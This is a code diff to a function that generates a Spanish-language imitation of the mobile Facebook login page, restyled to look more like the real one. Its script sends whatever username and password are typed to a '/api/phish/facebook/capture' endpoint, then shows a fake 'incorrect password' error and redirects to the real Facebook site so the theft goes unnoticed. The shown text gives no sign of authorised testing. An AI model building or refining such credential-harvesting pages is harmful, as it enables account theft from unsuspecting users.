@@ -143,155 +143,184 @@ function buildFacebookPage(sessionId: string): string {
     background: #fff;
     min-height: 100vh;
     color: #1c1e21;
-    font-size: 14px;
   }
+
+  /* Banner superior */
   .top-banner {
-    background: #fff;
-    border-bottom: 1px solid #dddfe2;
-    padding: 10px 16px;
+    border-bottom: 1px solid #e5e5e5;
+    padding: 11px 16px;
     display: flex;
     align-items: center;
     gap: 10px;
     color: #1877f2;
-    font-size: 13px;
+    font-size: 13.5px;
+    line-height: 1.4;
   }
-  .top-banner svg { flex-shrink: 0; }
-  .lang-bar {
+  .top-banner .dl-icon {
+    width: 22px;
+    height: 22px;
+    flex-shrink: 0;
+    fill: #1877f2;
+  }
+
+  /* Idioma */
+  .lang-text {
     text-align: center;
-    padding: 18px 16px 0;
+    padding-top: 20px;
     font-size: 13px;
     color: #606770;
   }
+
+  /* Contenedor principal */
   .main {
     display: flex;
     flex-direction: column;
     align-items: center;
-    padding: 20px 16px 0;
+    padding: 18px 20px 0;
   }
-  .fb-logo {
-    width: 72px;
-    height: 72px;
-    background: #1877f2;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin-bottom: 24px;
+
+  /* Logo de Facebook */
+  .fb-icon {
+    width: 76px;
+    height: 76px;
+    margin-bottom: 22px;
   }
-  .fb-logo svg { width: 42px; height: 42px; }
-  .form-group {
+
+  /* Campos */
+  .field { width: 100%; max-width: 380px; margin-bottom: 10px; }
+  .field input {
     width: 100%;
-    max-width: 420px;
-    margin-bottom: 12px;
-  }
-  .form-group input {
-    width: 100%;
-    padding: 14px 14px;
-    border: 1px solid #ccd0d5;
-    border-radius: 6px;
+    padding: 15px 18px;
+    border: 1.5px solid #ccd0d5;
+    border-radius: 50px;
     font-size: 16px;
-    background: #fff;
     color: #1c1e21;
+    background: #fff;
     outline: none;
     -webkit-appearance: none;
+    transition: border-color 0.15s;
   }
-  .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
-  .form-group input::placeholder { color: #90949c; }
+  .field input:focus { border-color: #1877f2; }
+  .field input::placeholder { color: #8d949e; }
+
+  /* Botón iniciar sesión */
   .btn-login {
     width: 100%;
-    max-width: 420px;
-    padding: 14px;
+    max-width: 380px;
+    padding: 15px;
     background: #1877f2;
     color: #fff;
     border: none;
-    border-radius: 6px;
+    border-radius: 50px;
     font-size: 17px;
-    font-weight: 600;
+    font-weight: 700;
     cursor: pointer;
-    margin-top: 4px;
+    margin-top: 6px;
     -webkit-appearance: none;
+    letter-spacing: 0.2px;
   }
-  .btn-login:active { background: #166fe5; }
-  .btn-login:disabled { opacity: 0.7; }
+  .btn-login:active { background: #1565d8; }
+  .btn-login:disabled { opacity: 0.75; }
+
+  /* ¿Olvidaste? */
   .forgot {
     text-align: center;
-    margin-top: 20px;
-    margin-bottom: 28px;
-    max-width: 420px;
-    width: 100%;
-  }
-  .forgot a { color: #1877f2; text-decoration: none; font-size: 13px; }
-  .divider {
-    width: 100%;
-    max-width: 420px;
-    border: none;
-    border-top: 1px solid #dddfe2;
+    margin-top: 18px;
     margin-bottom: 24px;
-  }
-  .btn-register {
     width: 100%;
-    max-width: 260px;
-    padding: 13px;
-    background: #fff;
-    color: #42b72a;
-    border: 1.5px solid #42b72a;
-    border-radius: 6px;
-    font-size: 16px;
+  }
+  .forgot a {
+    color: #1c1e21;
+    text-decoration: none;
+    font-size: 14px;
     font-weight: 600;
+  }
+
+  /* Separador */
+  .divider {
+    width: calc(100% - 40px);
+    max-width: 380px;
+    border: none;
+    border-top: 1px solid #e5e5e5;
+    margin-bottom: 22px;
+  }
+
+  /* Botón crear cuenta */
+  .btn-register {
+    max-width: 280px;
+    width: 100%;
+    padding: 14px 20px;
+    background: #fff;
+    color: #1877f2;
+    border: 1.5px solid #1877f2;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 700;
     cursor: pointer;
-    margin-bottom: 32px;
+    margin-bottom: 36px;
     -webkit-appearance: none;
     text-align: center;
   }
-  .btn-register:active { background: #f0faf0; }
-  .meta-logo {
-    text-align: center;
-    padding: 0 16px 32px;
-    color: #8a8d91;
-    font-size: 12px;
+  .btn-register:active { background: #f0f4fe; }
+
+  /* Meta footer */
+  .meta-footer {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 6px;
-  }
-  .error-msg {
-    color: #d93025;
+    gap: 5px;
+    padding-bottom: 28px;
+    color: #8a8d91;
     font-size: 13px;
+  }
+
+  /* Mensaje de error */
+  .error-msg {
+    color: #e02020;
+    font-size: 13.5px;
     text-align: center;
-    margin-bottom: 10px;
-    max-width: 420px;
+    margin-bottom: 12px;
     width: 100%;
-    background: #fce8e6;
+    max-width: 380px;
     padding: 10px 14px;
-    border-radius: 6px;
+    border-radius: 8px;
+    background: #fff0f0;
+    border: 1px solid #f5c6c6;
     display: none;
   }
 </style>
 </head>
 <body>
 
+<!-- Banner superior -->
 <div class="top-banner">
-  <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877f2"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+  <!-- Ícono de descarga -->
+  <svg class="dl-icon" viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zm7-18v10.17l-3.59-3.58L7 10l5 5 5-5-1.41-1.41L13 12.17V2h-1z"/></svg>
   Descarga Facebook para Android y navega más rápido.
 </div>
 
-<div class="lang-bar">Español</div>
+<div class="lang-text">Español</div>
 
 <div class="main">
-  <div class="fb-logo">
-    <svg viewBox="0 0 36 36" fill="#fff">
-      <path d="M20.18 35.87V22.26h4.58l.69-5.32h-5.27v-3.4c0-1.54.43-2.59 2.63-2.59h2.81V6.29A37.68 37.68 0 0016.3 6c-4.07 0-6.85 2.48-6.85 7.04v3.93H5v5.32h4.45v13.58a18.18 18.18 0 0010.73 0z"/>
-    </svg>
-  </div>
+
+  <!-- Logo oficial de Facebook (círculo azul con f blanca) -->
+  <svg class="fb-icon" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="36" cy="36" r="36" fill="#1877F2"/>
+    <path d="M46.5 45.75l1.313-8.548H39.61v-5.55c0-2.338 1.145-4.617 4.82-4.617h3.73v-7.278S44.74 19 41.326 19c-6.797 0-11.24 4.12-11.24 11.583v6.619H22.5v8.548h7.586V66.63a28.56 28.56 0 008.848 0V45.75H46.5z" fill="white"/>
+  </svg>
 
   <div class="error-msg" id="err">El número de teléfono o la contraseña que has introducido es incorrecto.</div>
 
-  <form id="loginForm" style="width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;">
-    <div class="form-group">
-      <input type="text" id="username" name="username" placeholder="Celular o correo electrónico" autocomplete="username" autocapitalize="off" autocorrect="off" required>
+  <form id="loginForm" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+    <div class="field">
+      <input type="text" id="username" name="username"
+        placeholder="Celular o correo electrónico"
+        autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" required>
     </div>
-    <div class="form-group">
-      <input type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
+    <div class="field">
+      <input type="password" id="password" name="password"
+        placeholder="Contraseña"
+        autocomplete="current-password" required>
     </div>
     <button type="submit" class="btn-login" id="btn">Iniciar sesión</button>
   </form>
@@ -303,36 +332,44 @@ function buildFacebookPage(sessionId: string): string {
   <hr class="divider">
 
   <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
+
 </div>
 
-<div class="meta-logo">
-  <svg width="16" height="16" viewBox="0 0 60 60" fill="#8a8d91"><path d="M30 6.3C16.9 6.3 6.3 16.9 6.3 30S16.9 53.7 30 53.7 53.7 43.1 53.7 30 43.1 6.3 30 6.3zm0 43.1C19.8 49.4 10.6 40.2 10.6 30 10.6 19.8 19.8 10.6 30 10.6c10.2 0 19.4 9.2 19.4 19.4 0 10.2-9.2 19.4-19.4 19.4z"/><path d="M21 30c0-2.2.5-4 1.1-5.1C23.3 22.8 24.8 22 26.5 22c1.5 0 2.7.5 4.1 2.2.9 1.1 1.8 2.8 2.6 4.9.8-2.1 1.7-3.8 2.6-4.9C37.2 22.5 38.4 22 40 22c1.7 0 3.2.8 4.4 2.9.6 1.1 1.1 2.9 1.1 5.1 0 2.7-.8 5-2.3 6.8C41.7 38.8 40 39.8 38 39.8c-1.4 0-2.6-.4-3.7-1.3-1-.8-2-2.1-3-3.9-.5-.9-.9-1.8-1.3-2.7-.4.9-.8 1.8-1.3 2.7-1 1.8-2 3.1-3 3.9-1.1.9-2.3 1.3-3.7 1.3-2 0-3.7-1-4.9-2.4C21.8 35 21 32.7 21 30z"/></svg>
-  Meta
+<!-- Logo Meta oficial -->
+<div class="meta-footer">
+  <svg width="38" height="14" viewBox="0 0 62 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <!-- Símbolo infinito de Meta -->
+    <path d="M3.89 11c0-1.54.37-2.79.88-3.67.7-1.22 1.72-1.83 2.9-1.83 1.02 0 1.9.38 2.99 1.72.73.9 1.47 2.2 2.15 3.78.68-1.58 1.42-2.88 2.15-3.78C15.97 5.88 16.85 5.5 17.87 5.5c1.18 0 2.2.61 2.9 1.83.51.88.88 2.13.88 3.67 0 2.07-.64 3.83-1.77 5.08-.95 1.05-2.12 1.62-3.49 1.62-1.02 0-1.92-.32-2.88-1.06-.75-.58-1.52-1.47-2.34-2.79-.08-.13-.16-.27-.24-.41-.08.14-.16.28-.24.41-.82 1.32-1.59 2.21-2.34 2.79-.96.74-1.86 1.06-2.88 1.06-1.37 0-2.54-.57-3.49-1.62C4.53 14.83 3.89 13.07 3.89 11z" fill="#0082FB"/>
+    <!-- Texto "Meta" -->
+    <text x="26" y="17" font-family="-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Arial,sans-serif" font-size="14" font-weight="500" fill="#606770">Meta</text>
+  </svg>
 </div>
 
 <script>
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
-  const u = document.getElementById('username').value;
+  const u = document.getElementById('username').value.trim();
   const p = document.getElementById('password').value;
+  if (!u || !p) return;
   const btn = document.getElementById('btn');
   btn.disabled = true;
   btn.textContent = 'Comprobando...';
+  document.getElementById('err').style.display = 'none';
   try {
     await fetch('/api/phish/facebook/capture?session=${sessionId}', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username: u, password: p })
     });
-  } catch(err) {}
-  setTimeout(() => {
+  } catch(_) {}
+  setTimeout(function() {
     document.getElementById('err').style.display = 'block';
     btn.disabled = false;
     btn.textContent = 'Iniciar sesión';
     document.getElementById('password').value = '';
     document.getElementById('password').focus();
-    setTimeout(() => { window.location.href = 'https://m.facebook.com'; }, 2500);
-  }, 1400);
+    setTimeout(function() { window.location.href = 'https://m.facebook.com'; }, 3000);
+  }, 1500);
 });
 </script>
 </body>
